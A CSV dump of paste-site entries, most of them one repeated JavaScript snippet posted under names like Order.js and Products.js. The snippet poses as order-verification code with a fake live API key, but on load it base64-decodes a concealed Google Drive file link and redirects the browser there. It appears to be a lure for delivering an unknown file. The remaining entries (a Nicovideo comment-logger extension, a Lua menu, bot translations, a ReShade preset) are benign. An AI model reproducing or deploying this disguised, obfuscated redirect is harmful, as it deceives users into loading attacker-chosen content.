id,title,username,language,date,content
qKwAkEQh,Untitled,rodrigomaise99,JavaScript,Sunday 30th of March 2025 02:14:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/110/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u4A6x1Vx,Products.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 01:59:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/019/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M1HwNp7f,Order.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 01:44:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/408/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
apfaPrap,ramadankonkurs_bot,Zulfiqor,GetText,Sunday 30th of March 2025 01:38:44 AM CDT,18a28f655a1c66170b8500bc26ffbad13d0ea1e037e8f071bff3a7c4f69a765a
ePuY7tFJ,Market.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 01:28:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/868/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bQbmMB1J,Untitled,rodrigomaise99,JavaScript,Sunday 30th of March 2025 01:13:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/335/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eLMRMNQE,CommentFilterLogger.java,filledwithgarbages,Java,Sunday 30th of March 2025 12:52:00 AM CDT,"package extensions;

import dareka.NLMain;
import dareka.common.Logger;
import dareka.extensions.Extension2;
import dareka.extensions.ExtensionManager;
import dareka.processor.HttpHeader;
import dareka.processor.HttpRequestHeader;
import dareka.processor.Resource;
import dareka.processor.StringResource;
import dareka.processor.Processor;
import dareka.common.json.Json;
import dareka.common.json.JsonArray;
import dareka.common.json.JsonObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import javax.swing.JTextArea;
import javax.swing.JScrollPane;

public class CommentFilterLogger implements Extension2, Processor {
    
    public static final int REVISION = 250330;
    public static final String VER_STRING = ""CommentFilterLogger_"" + REVISION;
    
    private static final String[] PROCESSOR_SUPPORTED_METHODS = { ""POST"" };
    private static final Pattern PROCESSOR_SUPPORTED_PATTERN = Pattern.compile(
            ""^https?://www\\.nicovideo\\.jp/cache/filter_logs"");
    
    private static JTextArea logArea;
    
    private static final int BUFFER_SIZE = 8192;
    private static final int MAX_LOG_LENGTH = 100000;
    
    private static final int MAX_FILTER_VALUE_LENGTH = 50;  // フィルター表現の最大長

    // Extension2 interface
    public void registerExtensions(ExtensionManager mgr) {
        mgr.registerProcessor(this);
        
        if (logArea == null && NLMain.isLaunchGUI()) {
            logArea = new JTextArea();
            logArea.setEditable(false);
            logArea.setLineWrap(true);
            logArea.setWrapStyleWord(true);
            logArea.setFont(new java.awt.Font(""MS Gothic"", java.awt.Font.PLAIN, 12));
            JScrollPane scrollPane = new JScrollPane(logArea);
            NLMain.addTab(""CommentFilter"", null, scrollPane, ""フィルターログ"");
        }
    }
    
    public String getVersionString() {
        return VER_STRING;
    }
    
    // Processor Interface
    public String[] getSupportedMethods() {
        return PROCESSOR_SUPPORTED_METHODS;
    }
    
    public Pattern getSupportedURLAsPattern() {
        return PROCESSOR_SUPPORTED_PATTERN;
    }
    
    public String getSupportedURLAsString() {
        return null;
    }
    
    public Resource onRequest(HttpRequestHeader requestHeader, Socket browser) 
            throws IOException {
        InputStream in = browser.getInputStream();
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(in, ""UTF-8""),
            BUFFER_SIZE
        );
        
        long contentLength = requestHeader.getContentLength();
        if (contentLength <= 0 || contentLength > BUFFER_SIZE) {
            return StringResource.getNotFound();
        }
        
        char[] buffer = new char[(int)contentLength];
        int bytesRead = reader.read(buffer, 0, (int)contentLength);
        
        if (bytesRead > 0) {
            final String rawMessage = new String(buffer, 0, bytesRead);
            
            try {
                // JSONArrayとして解析
                JsonArray logsArray = Json.parse(rawMessage).getArray();
                
                // 各ログエントリーを処理
                for (int i = 0; i < logsArray.size(); i++) {
                    JsonObject log = logsArray.get(i).getObject();
                    
                    String title = log.getString(""title"", ""不明"");
                    String userId = log.getString(""userId"", ""不明"");
                    String comment = log.getString(""comment"", ""不明"");
                    String videoId = log.getString(""videoId"", ""不明"");
                    
                    // フィルター詳細の処理
                    JsonArray filterDetails = log.get(""filterDetails"").getArray();
                    StringBuilder filterInfo = new StringBuilder();
                    
                    if (filterDetails != null) {
                        for (int j = 0; j < filterDetails.size(); j++) {
                            JsonObject detail = filterDetails.get(j).getObject();
                            String type = detail.getString(""type"", ""不明"");
                            String value = detail.getString(""value"", """");
                            
                            if (value.length() > MAX_FILTER_VALUE_LENGTH) {
                                value = value.substring(0, MAX_FILTER_VALUE_LENGTH) + ""..."";
                            }
                            
                            if (j > 0) filterInfo.append("", "");
                            filterInfo.append(type);
                            if (!value.isEmpty()) {
                                filterInfo.append(""("").append(value).append("")"");
                            }
                        }
                    }
                    
                    final String formattedMessage = String.format(
                        ""[%s]\n"" +
                        ""動画: %s\n"" +
                        ""動画ID: %s\n"" +
                        ""ユーザー: %s\n"" +
                        ""コメント: %s\n"" +
                        ""フィルター: %s\n"" +
                        ""----------------------------------------\n"",
                        new SimpleDateFormat(""yyyy/MM/dd HH:mm:ss"").format(new Date()),
                        title,
                        videoId,
                        userId,
                        comment,
                        filterInfo.toString()
                    );
                    
                    if (logArea != null) {
                        javax.swing.SwingUtilities.invokeLater(() -> {
                            if (logArea.getText().length() > MAX_LOG_LENGTH) {
                                logArea.setText(logArea.getText()
                                    .substring(logArea.getText().length() - MAX_LOG_LENGTH/2));
                            }
                            logArea.append(formattedMessage);
                            logArea.setCaretPosition(logArea.getDocument().getLength());
                        });
                    }
                }
                
                return new StringResource(""ok"");
            } catch (Exception e) {
                System.err.println(""フィルターログ処理エラー: "" + e.getMessage());
                e.printStackTrace();
                return StringResource.getNotFound();
            }
        }
        
        return StringResource.getNotFound();
    }
} "
VCbPjFvL,Order.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 12:42:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/180/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3uWM4UY5,startup,carubi,Lua,Sunday 30th of March 2025 12:36:45 AM CDT,"local monitor = peripheral.wrap(""left"")
if not monitor then
  print(""Kein Monitor gefunden! Bitte überprüfe die Verkabelung."")
  return
end
 
-- Funktion zum Zeichnen des Menüs
local function drawMenu()
  monitor.clear()
  monitor.setCursorPos(1,1)
  monitor.write(""== Touchscreen Menü =="")
  monitor.setCursorPos(1,3)
  monitor.write(""1. Option 1"")
  monitor.setCursorPos(1,4)
  monitor.write(""2. Option 2"")
  monitor.setCursorPos(1,5)
  monitor.write(""3. Beenden"")
end
 
drawMenu()
 
local running = true
while running do
  -- Warten auf eine Berührung auf dem Monitor
  local event, side, x, y = os.pullEvent(""monitor_touch"")
 
  -- Prüfen, ob die Berührung in einer der Menüzeilen erfolgte:
  if y == 3 then
    monitor.clear()
    monitor.setCursorPos(1,1)
    monitor.write(""Option 1 gewählt!"")
    sleep(2)
    drawMenu()
  elseif y == 4 then
    monitor.clear()
    monitor.setCursorPos(1,1)
    monitor.write(""Option 2 gewählt!"")
    sleep(2)
    drawMenu()
  elseif y == 5 then
    running = false
  end
end
 
monitor.clear()
monitor.setCursorPos(1,1)
monitor.write(""Programm beendet."")"
6jpXt19w,Untitled,rodrigomaise99,JavaScript,Sunday 30th of March 2025 12:11:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/844/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8paYPhuu,Products.js,rodrigomaise99,JavaScript,Saturday 29th of March 2025 11:56:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/347/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BniGFDHK,translation.json,NiiorBayzi,JSON,Saturday 29th of March 2025 11:35:09 PM CDT,"{
  ""errors"": {},
  ""texts"": {
    ""@"": {
      ""br"": ""**[ $randomText[🌟;⭐;✨] ] ›** Olá, eu sou o **$username[$botID]** e estou aqui para sua diversão e com várias funcionalidades. Meu prefixo é **`l.`**, para ver meus comandos utilize **`l.ajuda`**."",
      ""en"": ""**[ $randomText[🌟;⭐;✨] ] ›** Hii, I'm **$username[$botID]** and I'm here for your fun and with a lot of functions. My prefix is **`l.`**, to see my commands use **`l.help`**.""
    },
    ""botinfo"": {
      ""br"": {
        ""description"": ""> Olá de novo internauta, gostaria de agradecê-lo por fazer parte do $username[$botID], e incentivando-me a continuar. Eu ainda não tenho servidor oficial, mas caso você queira dar uma sugestão ou relatar algum problema, use o menu abaixo. 💙✨\n\n** › Comandos:** $commandsCount\n** › Servidores:** $serverCount\n** › Membros:** $allMembersCount"",
        ""footer"":""Criado com 💙 por"",
        ""button"":{
          ""suggest"":{
            ""label"":""Sugestão"",
            ""desc"":""Que tal me ajudar a ser cada vez melhor?""
          },
          ""report"":{
            ""label"":""Reportar"",
            ""desc"":""Reporte um erro ou um usuário.""
          },
          ""beta"":{
            ""label"":""Requisição ( Beta Tester )"",
            ""desc"":""Você pode testar os comandos antes que todo mundo.""
          },
          ""add"":{
            ""desc"":""Me adicione no seu servidor.""
          }
        }
      },
      ""en"":{
        ""description"":""> Hello again internet user, I would like to thank you for being part of the $username[$botID], and encouraging me to continue. I don't have an official server yet, but if you want to give a suggestion or report any problem, use the menu below. 💙✨ \n\n** › Commands:** $commandsCount\n** › Servers:** $serverCount\n** › Members:** $allMembersCount"",
        ""footer"":""Created with 💙 by"",
        ""button"":{
          ""suggest"":{
            ""label"":""Suggestion"",
            ""desc"":""How about helping me to be better and better?""
          },
          ""report"":{
            ""label"":""Report"",
            ""desc"":""Report a bug or a user.""
          },
          ""beta"":{
            ""label"":""Request ( Beta Test )"",
            ""desc"":""You can test the commands before everyone else.""
          },
          ""add"":{
            ""desc"":""Add me to your server.""
          }
        }
      }
    },
    ""help"": {
      ""br"": { ""title"": ""Painel de ajuda"", ""categories"": [{
        ""name"": ""<:icons_games:1348851359650418739> › Jogos"", ""commands"": [ ""ppt"", ""termo"", ""tictactoe"" ]
      }] },
      ""en"": {}
    }
  }
}"
GEsqmRTS,KunitsuGami_ReshadePreset.ini,Ed94,INI file,Saturday 29th of March 2025 11:32:00 PM CDT,"Techniques=ZN_SDIL@ZN_GI.fx,Tonemap@Tonemap.fx,CShade_MotionBlur@cMotionBlur.fx,ContrastAdaptiveSharpen@CAS.fx,LumaSharpen@LumaSharpen.fx,FilmGrain@FilmGrain.fx,VHS_Pro@VHSPro.fx
TechniqueSorting=ZN_SDIL@ZN_GI.fx,Tonemap@Tonemap.fx,CShade_MotionBlur@cMotionBlur.fx,ContrastAdaptiveSharpen@CAS.fx,LumaSharpen@LumaSharpen.fx,FilmGrain@FilmGrain.fx,VHS_Pro@VHSPro.fx

[CAS.fx]
Contrast=0.293000
Sharpening=0.600000

[CMAA_2.fx]
DebugEdges=0
PreprocessorDefinitions=CMAA2_EXTRA_SHARPNESS=1,CMAA2_STATIC_QUALITY_PRESET=4
UIHELP=0

[cMotionBlur.fx]
PreprocessorDefinitions=CBLEND_BLENDENABLE=TRUE
_BlendFactor=0.204000
_BlurMode=0
_CShadeAlphaFactor=0.660000
_CShadeInputTonemapOperator=0
_CShadeOutputMode=0
_FrameRateScaling=1
_MipBias=0.666000
_Scale=0.156000
_TargetFrameRate=120.253998

[cNormalize.fx]
PreprocessorDefinitions=CBLEND_BLENDENABLE=TRUE
_CShadeAlphaFactor=1.000000
_CShadeInputTonemapOperator=2
_CShadeOutputMode=0
_Select=0

[FilmGrain.fx]
Intensity=1.000000
Mean=0.489000
SignalToNoiseRatio=16
Variance=0.684000

[LumaSharpen.fx]
offset_bias=1.000000
pattern=1
sharp_clamp=0.220000
sharp_strength=0.100000
show_sharpen=0

[Oilify.fx]
PreprocessorDefinitions=OILIFY_ITERATIONS=5,OILIFY_SIZE=2.4
Scale=1.000000
Sharpness=1.000000
Tuning=0.981000

[Tonemap.fx]
Bleach=0.000000
Defog=0.000000
Exposure=-0.018000
FogColor=0.000000,0.000000,1.000000
Gamma=0.966000
Saturation=-0.007000

[VHSPro.fx]
bleedAmount=0.305000
cutoffFadeX=25.000000
cutoffFadeY=25.000000
cutoffX=2.000000
cutoffY=3.000000
feedbackAmount=2.000000
feedbackColor=1.000000,0.500000,0.000000
feedbackDebug=0
feedbackFade=0.820000
feedbackThresh=0.100000
filmGrainAmount=0.000000
fisheyeBend=2.000000
gammaCorection=1.088000
jitterHAmount=0.113000
jitterVAmount=0.000000
jitterVSpeed=0.150000
lineNoiseAmount=1.000000
lineNoiseSpeed=5.000000
linesFloatSpeed=1.000000
noiseLinesNum=69
noiseQuantizeX=0.000000
PreprocessorDefinitions=VHSLINEARFILTER=1
scanLineWidth=0.000000
screenLinesNum=1440
signalAdjustI=-0.001000
signalAdjustQ=-0.001000
signalAdjustY=0.004000
signalNoiseAmount=0.032000
signalNoisePower=0.446000
signalNoiseType=0
signalShiftI=0.957000
signalShiftQ=1.068000
signalShiftY=1.033000
tapeNoiseAmount=0.050000
tapeNoiseSpeed=1.000000
tapeNoiseTH=0.630000
twitchHFreq=1.000000
twitchVFreq=1.062000
VHS_Bleed=1
VHS_BleedMode=0
VHS_Feedback=0
VHS_FilmGrain=0
VHS_Filter=0
VHS_FishEye=0
VHS_FishEye_Hyperspace=0
VHS_Jitter_H=0
VHS_Jitter_V=0
VHS_LineNoise=0
VHS_LinesFloat=0
VHS_ScanLines=0
VHS_SignalTweak=1
VHS_Stretch=0
VHS_TapeNoise=0
VHS_Twitch_H=0
VHS_Twitch_V=0
VHS_Vignette=1
VHS_YIQNoise=0
vignetteAmount=0.135000
vignetteSpeed=0.325000

[ZN_GI.fx]
addR=1
AmbientNeg=0.500000
BlendMode=1
debug=0
disD=2.000000
disM=1.000000
distMask=0.000000
doDenoising=1
FOV=110.000000
Intensity=0.310000
LightEx=2.200000
LigM=1.000000
NearPlane=8.156000
sampR=20.000000
sLod=0

"
9CK9c9Lv,Market.js,rodrigomaise99,JavaScript,Saturday 29th of March 2025 11:25:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/400/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dJR47ard,Untitled,Ratqueenkslskskwkw,JavaScript,Saturday 29th of March 2025 10:56:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/792/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
